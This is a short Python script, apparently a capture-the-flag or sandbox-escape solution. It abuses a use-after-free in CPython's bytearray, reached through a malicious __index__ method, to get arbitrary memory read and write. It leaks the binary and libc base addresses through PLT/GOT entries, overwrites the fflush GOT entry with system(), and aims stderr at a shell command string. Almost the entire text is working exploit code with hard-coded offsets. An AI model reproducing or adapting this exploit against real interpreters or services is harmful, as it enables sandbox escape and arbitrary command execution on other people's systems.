class B:
    def __index__(self):
        global memory
        uaf.clear()
        memory = bytearray()
        uaf.extend([0] * 56)
        return 1

uaf = bytearray(56)
uaf[23] = B()

vm = lambda x: hex(id(x))
# pie leak!
print('leaking pie...')
base_address = id(0) - 0x56e828 # offset!
print('base address:', hex(base_address))

print('leaking geteuid@plt address...')
geteuid_plt_address = base_address + 0xee670 # offset derived from reading the actual python3.11 binary
print('geteuid@plt:', hex(geteuid_plt_address))
x_g = lambda x: memory[x:x+8]
geteuid_call = x_g(geteuid_plt_address)
geteuid_offset = int.from_bytes(geteuid_call[2:5], byteorder='little')
print('geteuid_offset:', hex(geteuid_offset))
geteuid_got_address = geteuid_offset + geteuid_plt_address + 0x6
print('geteuid@got:', hex(geteuid_got_address))
geteuid_libc_address = int.from_bytes(x_g(geteuid_got_address), byteorder='little')
libc_address = geteuid_libc_address - 0xe2df0 # see above
print('leaked libc base:',  hex(libc_address)) 

stderr_addr = base_address + 0x597020
print(hex(stderr_addr))

fflush_plt_address = base_address + 0xef5b0
fflush_call = x_g(fflush_plt_address)
fflush_offset = int.from_bytes(fflush_call[2:5], byteorder='little')
fflush_got_address = fflush_offset + fflush_plt_address + 0x6

system_libc_address = libc_address + 0x53110
bs = bytearray(system_libc_address.to_bytes(8, byteorder='little'))
for i in range(8):
    memory[fflush_got_address + i] = bs[i]

target_str = b"ls -alps"
target_offset = id(target_str) + 0x20
bs = bytearray(target_offset.to_bytes(8, byteorder='little'))
for i in range(8):
    memory[stderr_addr+i] = bs[i]

